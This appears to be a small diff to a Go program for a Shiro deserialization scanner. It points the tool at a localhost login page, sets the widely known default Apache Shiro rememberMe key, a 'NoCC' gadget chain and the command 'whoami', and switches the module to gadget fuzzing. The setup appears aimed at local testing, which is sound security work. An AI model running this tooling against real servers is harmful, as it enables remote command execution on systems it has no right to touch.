@@ -16,9 +16,9 @@ var target = new(ShiroScanner.ShiroTarget)
 //}
 
 func main() {
-	module := "key"
+	module := "gadgetfuzz"
 	base := "http://127.0.0.1:8000/login.jsp"
-	key := "123"
+	key := "kPH+bIxk5D2deZiIxcaaaA=="
 	gadget := "NoCC"
 	command := "whoami"
 	factory := ShiroScanner.InitFactory(module)
